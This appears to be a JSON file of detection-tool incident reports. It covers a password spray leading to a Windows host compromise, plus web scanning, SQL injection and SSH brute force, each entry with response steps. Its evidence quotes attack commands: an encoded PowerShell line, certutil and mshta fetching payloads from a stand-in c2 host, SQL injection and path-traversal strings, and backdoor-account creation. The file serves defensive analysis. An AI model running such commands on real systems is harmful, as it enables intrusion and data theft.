@@ -1,0 +1,592 @@
+[
+  {
+    "id": "INC-001",
+    "title": "Multi-stage intrusion: Initial Access > Credential Access > Execution > Command and Control > Defense Evasion > Persistence > Privilege Escalation",
+    "severity": "critical",
+    "risk_score": 91,
+    "first_seen": "2026-11-17T10:02:22+00:00",
+    "last_seen": "2026-11-17T10:31:00+00:00",
+    "source_ips": [
+      "198.51.100.77"
+    ],
+    "users": [
+      "svc_backup"
+    ],
+    "hosts": [
+      "RDS01"
+    ],
+    "tactics": [
+      "Initial Access",
+      "Credential Access",
+      "Execution",
+      "Command and Control",
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation"
+    ],
+    "techniques": [
+      "T1078",
+      "T1110",
+      "T1110.003",
+      "T1059.001",
+      "T1027",
+      "T1105",
+      "T1218.005",
+      "T1218.010",
+      "T1218.011",
+      "T1136.001",
+      "T1098",
+      "T1543.003",
+      "T1070.001"
+    ],
+    "recommended_actions": [
+      "Disable the account and kill its active sessions immediately.",
+      "Pull all activity by this account and source IP after the successful login.",
+      "Reset credentials and rotate any secrets the account could reach.",
+      "Block the source IP and review every account it targeted for later successful logins.",
+      "Force a password reset and MFA enrolment for any account that was successfully accessed.",
+      "Decode the Base64 (UTF-16LE) payload and extract URLs, IPs and file paths as IOCs.",
+      "Review the parent process and everything this host did in the following 30 minutes.",
+      "Isolate the host if the payload downloads or executes anything.",
+      "Retrieve the downloaded file and detonate or hash it (VirusTotal, sandbox).",
+      "Block the remote host at the proxy or DNS layer and hunt for other hosts that contacted it.",
+      "Collect the referenced URL and script and add them to blocklists.",
+      "Check the parent process to find what launched it.",
+      "Verify the creation against a change ticket; disable the account if there is none.",
+      "Confirm the change was authorised; remove the member and investigate the acting account if not.",
+      "Stop and delete the service, preserve the binary for analysis, and look for the dropper.",
+      "Treat as hands-on-keyboard activity and pull forwarded SIEM copies of the logs from before the clear.",
+      "Isolate the host and escalate to incident response."
+    ],
+    "alerts": [
+      {
+        "rule_id": "bruteforce-success",
+        "title": "Successful login after repeated failures",
+        "severity": "critical",
+        "tactic": "Initial Access",
+        "techniques": [
+          "T1078",
+          "T1110"
+        ],
+        "first_seen": "2026-11-17T10:02:22+00:00",
+        "last_seen": "2026-11-17T10:10:44+00:00",
+        "count": 22,
+        "entities": {
+          "src_ip": "198.51.100.77",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "The same source IP failed to log in at least five times and then succeeded. Treat the account as compromised until proven otherwise.",
+        "response": [
+          "Disable the account and kill its active sessions immediately.",
+          "Pull all activity by this account and source IP after the successful login.",
+          "Reset credentials and rotate any secrets the account could reach."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:02:22Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"alice\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:02:44Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"bob\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:03:06Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"carol\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:08:32Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"erin\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:08:54Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"frank\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:09:16Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"grace\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:09:38Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"heidi\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:10:00Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"ivan\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:10:22Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"judy\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:10:44Z\", \"EventID\": 4624, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"svc_backup\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}"
+        ]
+      },
+      {
+        "rule_id": "password-spray",
+        "title": "Password spraying (many accounts, one source)",
+        "severity": "high",
+        "tactic": "Credential Access",
+        "techniques": [
+          "T1110.003"
+        ],
+        "first_seen": "2026-11-17T10:02:22+00:00",
+        "last_seen": "2026-11-17T10:10:22+00:00",
+        "count": 21,
+        "entities": {
+          "src_ip": "198.51.100.77",
+          "user": "",
+          "host": "RDS01"
+        },
+        "description": "One source IP failed to log in as six or more different accounts within 15 minutes, the signature of a low-and-slow password spray that avoids per-account lockouts.",
+        "response": [
+          "Block the source IP and review every account it targeted for later successful logins.",
+          "Force a password reset and MFA enrolment for any account that was successfully accessed."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:02:22Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"alice\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:02:44Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"bob\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:03:06Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"carol\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:08:10Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"dave\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:08:32Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"erin\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:08:54Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"frank\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:09:16Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"grace\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:09:38Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"heidi\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:10:00Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"ivan\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}",
+          "{\"TimeCreated\": \"2026-11-17T10:10:22Z\", \"EventID\": 4625, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"judy\", \"IpAddress\": \"198.51.100.77\", \"LogonType\": \"10\"}}"
+        ]
+      },
+      {
+        "rule_id": "encoded-powershell",
+        "title": "PowerShell with encoded command",
+        "severity": "high",
+        "tactic": "Execution",
+        "techniques": [
+          "T1059.001",
+          "T1027"
+        ],
+        "first_seen": "2026-11-17T10:21:05+00:00",
+        "last_seen": "2026-11-17T10:21:05+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "PowerShell launched with a Base64 encoded command, a common way to hide payloads.",
+        "response": [
+          "Decode the Base64 (UTF-16LE) payload and extract URLs, IPs and file paths as IOCs.",
+          "Review the parent process and everything this host did in the following 30 minutes.",
+          "Isolate the host if the payload downloads or executes anything."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:21:05Z\", \"EventID\": 4688, \"Computer\": \"RDS01\", \"EventData\": {\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\", \"SubjectUserName\": \"svc_backup\"}}"
+        ]
+      },
+      {
+        "rule_id": "certutil-download",
+        "title": "Certutil used to download a file",
+        "severity": "high",
+        "tactic": "Command and Control",
+        "techniques": [
+          "T1105"
+        ],
+        "first_seen": "2026-11-17T10:21:40+00:00",
+        "last_seen": "2026-11-17T10:21:40+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "certutil.exe fetching a remote file is a classic living-off-the-land download technique.",
+        "response": [
+          "Retrieve the downloaded file and detonate or hash it (VirusTotal, sandbox).",
+          "Block the remote host at the proxy or DNS layer and hunt for other hosts that contacted it."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:21:40Z\", \"EventID\": 4688, \"Computer\": \"RDS01\", \"EventData\": {\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\certutil.exe\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"certutil.exe -urlcache -split -f http://c2.example.net/p.bin C:\\\\Users\\\\Public\\\\p.exe\", \"SubjectUserName\": \"svc_backup\"}}"
+        ]
+      },
+      {
+        "rule_id": "lolbin-remote-exec",
+        "title": "Signed binary fetching or running remote content",
+        "severity": "high",
+        "tactic": "Defense Evasion",
+        "techniques": [
+          "T1218.005",
+          "T1218.010",
+          "T1218.011"
+        ],
+        "first_seen": "2026-11-17T10:22:10+00:00",
+        "last_seen": "2026-11-17T10:22:10+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "mshta, regsvr32 or rundll32 run with a remote URL or script engine, used to proxy execution through a trusted Microsoft binary.",
+        "response": [
+          "Collect the referenced URL and script and add them to blocklists.",
+          "Check the parent process to find what launched it."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:22:10Z\", \"EventID\": 4688, \"Computer\": \"RDS01\", \"EventData\": {\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"mshta.exe http://c2.example.net/a.hta\", \"SubjectUserName\": \"svc_backup\"}}"
+        ]
+      },
+      {
+        "rule_id": "new-local-user",
+        "title": "New local user account created",
+        "severity": "medium",
+        "tactic": "Persistence",
+        "techniques": [
+          "T1136.001"
+        ],
+        "first_seen": "2026-11-17T10:23:00+00:00",
+        "last_seen": "2026-11-17T10:23:00+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "A new account was created. Unexpected accounts are a common persistence mechanism.",
+        "response": [
+          "Verify the creation against a change ticket; disable the account if there is none."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:23:00Z\", \"EventID\": 4720, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"backdoor\", \"SubjectUserName\": \"svc_backup\"}}"
+        ]
+      },
+      {
+        "rule_id": "admin-group-add",
+        "title": "Account added to a privileged group",
+        "severity": "high",
+        "tactic": "Privilege Escalation",
+        "techniques": [
+          "T1098"
+        ],
+        "first_seen": "2026-11-17T10:23:15+00:00",
+        "last_seen": "2026-11-17T10:23:15+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "A member was added to a high-privilege group.",
+        "response": [
+          "Confirm the change was authorised; remove the member and investigate the acting account if not."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:23:15Z\", \"EventID\": 4732, \"Computer\": \"RDS01\", \"EventData\": {\"TargetUserName\": \"Administrators\", \"MemberName\": \"backdoor\", \"SubjectUserName\": \"svc_backup\"}}"
+        ]
+      },
+      {
+        "rule_id": "suspicious-service",
+        "title": "Service installed from a suspicious path",
+        "severity": "high",
+        "tactic": "Persistence",
+        "techniques": [
+          "T1543.003"
+        ],
+        "first_seen": "2026-11-17T10:24:00+00:00",
+        "last_seen": "2026-11-17T10:24:00+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "A Windows service was registered with a binary in a user-writable location or a shell command line.",
+        "response": [
+          "Stop and delete the service, preserve the binary for analysis, and look for the dropper."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:24:00Z\", \"EventID\": 7045, \"Computer\": \"RDS01\", \"EventData\": {\"ServiceName\": \"WinUpdateSvc\", \"ImagePath\": \"C:\\\\Users\\\\Public\\\\p.exe\", \"SubjectUserName\": \"svc_backup\"}}"
+        ]
+      },
+      {
+        "rule_id": "log-cleared",
+        "title": "Windows event log cleared",
+        "severity": "critical",
+        "tactic": "Defense Evasion",
+        "techniques": [
+          "T1070.001"
+        ],
+        "first_seen": "2026-11-17T10:31:00+00:00",
+        "last_seen": "2026-11-17T10:31:00+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "",
+          "user": "svc_backup",
+          "host": "RDS01"
+        },
+        "description": "The Windows Security event log was cleared (Event ID 1102). Attackers do this to cover tracks.",
+        "response": [
+          "Treat as hands-on-keyboard activity and pull forwarded SIEM copies of the logs from before the clear.",
+          "Isolate the host and escalate to incident response."
+        ],
+        "evidence": [
+          "{\"TimeCreated\": \"2026-11-17T10:31:00Z\", \"EventID\": 1102, \"Computer\": \"RDS01\", \"EventData\": {\"SubjectUserName\": \"svc_backup\"}}"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "INC-002",
+    "title": "Multi-stage intrusion: Reconnaissance > Initial Access > Credential Access",
+    "severity": "critical",
+    "risk_score": 72,
+    "first_seen": "2026-11-17T08:41:00+00:00",
+    "last_seen": "2026-11-17T09:18:20+00:00",
+    "source_ips": [
+      "203.0.113.50"
+    ],
+    "users": [
+      "deploy"
+    ],
+    "hosts": [
+      "web01"
+    ],
+    "tactics": [
+      "Reconnaissance",
+      "Initial Access",
+      "Credential Access"
+    ],
+    "techniques": [
+      "T1595.003",
+      "T1595.002",
+      "T1190",
+      "T1078",
+      "T1110",
+      "T1110.001"
+    ],
+    "recommended_actions": [
+      "Rate-limit or block the source IP and review which paths (if any) returned 200.",
+      "Block the source IP; check whether any request returned 200 for a sensitive path.",
+      "Check application and database logs for the same timeframe; look for 200 or 500 responses.",
+      "Verify the endpoint uses parameterised queries and is behind a WAF rule.",
+      "Confirm no sensitive file was returned (status 200 with a large body) and patch the endpoint.",
+      "Disable the account and kill its active sessions immediately.",
+      "Pull all activity by this account and source IP after the successful login.",
+      "Reset credentials and rotate any secrets the account could reach.",
+      "Block the source IP at the firewall or WAF and check whether it appears in threat-intel feeds.",
+      "Confirm MFA and account lockout are enforced on the targeted service."
+    ],
+    "alerts": [
+      {
+        "rule_id": "web-404-flood",
+        "title": "Directory and file enumeration (404 flood)",
+        "severity": "medium",
+        "tactic": "Reconnaissance",
+        "techniques": [
+          "T1595.003"
+        ],
+        "first_seen": "2026-11-17T08:41:00+00:00",
+        "last_seen": "2026-11-17T08:41:27+00:00",
+        "count": 45,
+        "entities": {
+          "src_ip": "203.0.113.50",
+          "user": "",
+          "host": "web01"
+        },
+        "description": "A single IP generated 25 or more 404 responses in a minute, typical of content discovery tools.",
+        "response": [
+          "Rate-limit or block the source IP and review which paths (if any) returned 200."
+        ],
+        "evidence": [
+          "203.0.113.50 - - [17/Nov/2026:08:41:00 +0000] \"GET /admin HTTP/1.1\" 404 4673 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:01 +0000] \"GET /login.php HTTP/1.1\" 404 2216 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:01 +0000] \"GET /wp-login.php HTTP/1.1\" 404 7816 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:23 +0000] \"GET /old?38 HTTP/1.1\" 404 7116 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:24 +0000] \"GET /db.sql?39 HTTP/1.1\" 404 389 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:24 +0000] \"GET /administrator?40 HTTP/1.1\" 404 6170 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:25 +0000] \"GET /cgi-bin/test.cgi?41 HTTP/1.1\" 404 1986 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:25 +0000] \"GET /admin?42 HTTP/1.1\" 404 8896 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:26 +0000] \"GET /login.php?43 HTTP/1.1\" 404 3271 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:27 +0000] \"GET /wp-login.php?44 HTTP/1.1\" 404 1334 \"-\" \"Nikto/2.1.6\""
+        ]
+      },
+      {
+        "rule_id": "web-scanner-ua",
+        "title": "Known scanner user agent",
+        "severity": "medium",
+        "tactic": "Reconnaissance",
+        "techniques": [
+          "T1595.002"
+        ],
+        "first_seen": "2026-11-17T08:41:00+00:00",
+        "last_seen": "2026-11-17T08:41:27+00:00",
+        "count": 45,
+        "entities": {
+          "src_ip": "203.0.113.50",
+          "user": "",
+          "host": "web01"
+        },
+        "description": "Requests carrying the user agent of a well-known vulnerability scanner.",
+        "response": [
+          "Block the source IP; check whether any request returned 200 for a sensitive path."
+        ],
+        "evidence": [
+          "203.0.113.50 - - [17/Nov/2026:08:41:00 +0000] \"GET /admin HTTP/1.1\" 404 4673 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:01 +0000] \"GET /login.php HTTP/1.1\" 404 2216 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:01 +0000] \"GET /wp-login.php HTTP/1.1\" 404 7816 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:23 +0000] \"GET /old?38 HTTP/1.1\" 404 7116 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:24 +0000] \"GET /db.sql?39 HTTP/1.1\" 404 389 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:24 +0000] \"GET /administrator?40 HTTP/1.1\" 404 6170 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:25 +0000] \"GET /cgi-bin/test.cgi?41 HTTP/1.1\" 404 1986 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:25 +0000] \"GET /admin?42 HTTP/1.1\" 404 8896 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:26 +0000] \"GET /login.php?43 HTTP/1.1\" 404 3271 \"-\" \"Nikto/2.1.6\"",
+          "203.0.113.50 - - [17/Nov/2026:08:41:27 +0000] \"GET /wp-login.php?44 HTTP/1.1\" 404 1334 \"-\" \"Nikto/2.1.6\""
+        ]
+      },
+      {
+        "rule_id": "web-sqli",
+        "title": "SQL injection attempt",
+        "severity": "high",
+        "tactic": "Initial Access",
+        "techniques": [
+          "T1190"
+        ],
+        "first_seen": "2026-11-17T08:43:00+00:00",
+        "last_seen": "2026-11-17T08:43:09+00:00",
+        "count": 2,
+        "entities": {
+          "src_ip": "203.0.113.50",
+          "user": "",
+          "host": "web01"
+        },
+        "description": "The request URL contains common SQL injection payloads.",
+        "response": [
+          "Check application and database logs for the same timeframe; look for 200 or 500 responses.",
+          "Verify the endpoint uses parameterised queries and is behind a WAF rule."
+        ],
+        "evidence": [
+          "203.0.113.50 - - [17/Nov/2026:08:43:00 +0000] \"GET /products?id=1'%20OR%20'1'='1 HTTP/1.1\" 200 5514 \"-\" \"Mozilla/5.0 (compatible)\"",
+          "203.0.113.50 - - [17/Nov/2026:08:43:09 +0000] \"GET /search?q=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1\" 500 7294 \"-\" \"Mozilla/5.0 (compatible)\""
+        ]
+      },
+      {
+        "rule_id": "web-path-traversal",
+        "title": "Path traversal attempt",
+        "severity": "high",
+        "tactic": "Initial Access",
+        "techniques": [
+          "T1190"
+        ],
+        "first_seen": "2026-11-17T08:43:21+00:00",
+        "last_seen": "2026-11-17T08:43:21+00:00",
+        "count": 1,
+        "entities": {
+          "src_ip": "203.0.113.50",
+          "user": "",
+          "host": "web01"
+        },
+        "description": "The request URL tries to escape the web root to read arbitrary files.",
+        "response": [
+          "Confirm no sensitive file was returned (status 200 with a large body) and patch the endpoint."
+        ],
+        "evidence": [
+          "203.0.113.50 - - [17/Nov/2026:08:43:21 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 400 3489 \"-\" \"Mozilla/5.0 (compatible)\""
+        ]
+      },
+      {
+        "rule_id": "bruteforce-success",
+        "title": "Successful login after repeated failures",
+        "severity": "critical",
+        "tactic": "Initial Access",
+        "techniques": [
+          "T1078",
+          "T1110"
+        ],
+        "first_seen": "2026-11-17T09:14:03+00:00",
+        "last_seen": "2026-11-17T09:18:20+00:00",
+        "count": 61,
+        "entities": {
+          "src_ip": "203.0.113.50",
+          "user": "deploy",
+          "host": "web01"
+        },
+        "description": "The same source IP failed to log in at least five times and then succeeded. Treat the account as compromised until proven otherwise.",
+        "response": [
+          "Disable the account and kill its active sessions immediately.",
+          "Pull all activity by this account and source IP after the successful login.",
+          "Reset credentials and rotate any secrets the account could reach."
+        ],
+        "evidence": [
+          "Nov 17 09:14:03 web01 sshd[1341]: Failed password for root from 203.0.113.50 port 46540 ssh2",
+          "Nov 17 09:14:06 web01 sshd[3284]: Failed password for invalid user admin from 203.0.113.50 port 37388 ssh2",
+          "Nov 17 09:14:09 web01 sshd[7505]: Failed password for invalid user ubuntu from 203.0.113.50 port 43786 ssh2",
+          "Nov 17 09:16:45 web01 sshd[2789]: Failed password for invalid user test from 203.0.113.50 port 41603 ssh2",
+          "Nov 17 09:16:48 web01 sshd[4689]: Failed password for root from 203.0.113.50 port 47069 ssh2",
+          "Nov 17 09:16:51 web01 sshd[3531]: Failed password for invalid user admin from 203.0.113.50 port 52205 ssh2",
+          "Nov 17 09:16:54 web01 sshd[6521]: Failed password for invalid user ubuntu from 203.0.113.50 port 43656 ssh2",
+          "Nov 17 09:16:57 web01 sshd[6774]: Failed password for deploy from 203.0.113.50 port 51896 ssh2",
+          "Nov 17 09:17:00 web01 sshd[4317]: Failed password for invalid user test from 203.0.113.50 port 34598 ssh2",
+          "Nov 17 09:18:20 web01 sshd[5534]: Accepted password for deploy from 203.0.113.50 port 51122 ssh2"
+        ]
+      },
+      {
+        "rule_id": "login-bruteforce",
+        "title": "Brute-force login attempts",
+        "severity": "high",
+        "tactic": "Credential Access",
+        "techniques": [
+          "T1110.001"
+        ],
+        "first_seen": "2026-11-17T09:14:03+00:00",
+        "last_seen": "2026-11-17T09:17:00+00:00",
+        "count": 60,
+        "entities": {
+          "src_ip": "203.0.113.50",
+          "user": "",
+          "host": "web01"
+        },
+        "description": "Ten or more failed logins from one source IP within two minutes, against SSH or Windows.",
+        "response": [
+          "Block the source IP at the firewall or WAF and check whether it appears in threat-intel feeds.",
+          "Confirm MFA and account lockout are enforced on the targeted service."
+        ],
+        "evidence": [
+          "Nov 17 09:14:03 web01 sshd[1341]: Failed password for root from 203.0.113.50 port 46540 ssh2",
+          "Nov 17 09:14:06 web01 sshd[3284]: Failed password for invalid user admin from 203.0.113.50 port 37388 ssh2",
+          "Nov 17 09:14:09 web01 sshd[7505]: Failed password for invalid user ubuntu from 203.0.113.50 port 43786 ssh2",
+          "Nov 17 09:16:42 web01 sshd[8207]: Failed password for deploy from 203.0.113.50 port 57339 ssh2",
+          "Nov 17 09:16:45 web01 sshd[2789]: Failed password for invalid user test from 203.0.113.50 port 41603 ssh2",
+          "Nov 17 09:16:48 web01 sshd[4689]: Failed password for root from 203.0.113.50 port 47069 ssh2",
+          "Nov 17 09:16:51 web01 sshd[3531]: Failed password for invalid user admin from 203.0.113.50 port 52205 ssh2",
+          "Nov 17 09:16:54 web01 sshd[6521]: Failed password for invalid user ubuntu from 203.0.113.50 port 43656 ssh2",
+          "Nov 17 09:16:57 web01 sshd[6774]: Failed password for deploy from 203.0.113.50 port 51896 ssh2",
+          "Nov 17 09:17:00 web01 sshd[4317]: Failed password for invalid user test from 203.0.113.50 port 34598 ssh2"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "INC-003",
+    "title": "Known scanner user agent",
+    "severity": "medium",
+    "risk_score": 10,
+    "first_seen": "2026-11-17T13:20:00+00:00",
+    "last_seen": "2026-11-17T13:20:04+00:00",
+    "source_ips": [
+      "192.0.2.200"
+    ],
+    "users": [],
+    "hosts": [
+      "web01"
+    ],
+    "tactics": [
+      "Reconnaissance"
+    ],
+    "techniques": [
+      "T1595.002"
+    ],
+    "recommended_actions": [
+      "Block the source IP; check whether any request returned 200 for a sensitive path."
+    ],
+    "alerts": [
+      {
+        "rule_id": "web-scanner-ua",
+        "title": "Known scanner user agent",
+        "severity": "medium",
+        "tactic": "Reconnaissance",
+        "techniques": [
+          "T1595.002"
+        ],
+        "first_seen": "2026-11-17T13:20:00+00:00",
+        "last_seen": "2026-11-17T13:20:04+00:00",
+        "count": 3,
+        "entities": {
+          "src_ip": "192.0.2.200",
+          "user": "",
+          "host": "web01"
+        },
+        "description": "Requests carrying the user agent of a well-known vulnerability scanner.",
+        "response": [
+          "Block the source IP; check whether any request returned 200 for a sensitive path."
+        ],
+        "evidence": [
+          "192.0.2.200 - - [17/Nov/2026:13:20:00 +0000] \"GET / HTTP/1.1\" 200 8683 \"-\" \"sqlmap/1.7.11#stable (https://sqlmap.org)\"",
+          "192.0.2.200 - - [17/Nov/2026:13:20:02 +0000] \"GET /products?id=1 HTTP/1.1\" 200 1757 \"-\" \"sqlmap/1.7.11#stable (https://sqlmap.org)\"",
+          "192.0.2.200 - - [17/Nov/2026:13:20:04 +0000] \"GET /products?id=2 HTTP/1.1\" 200 7986 \"-\" \"sqlmap/1.7.11#stable (https://sqlmap.org)\""
+        ]
+      }
+    ]
+  }
+]
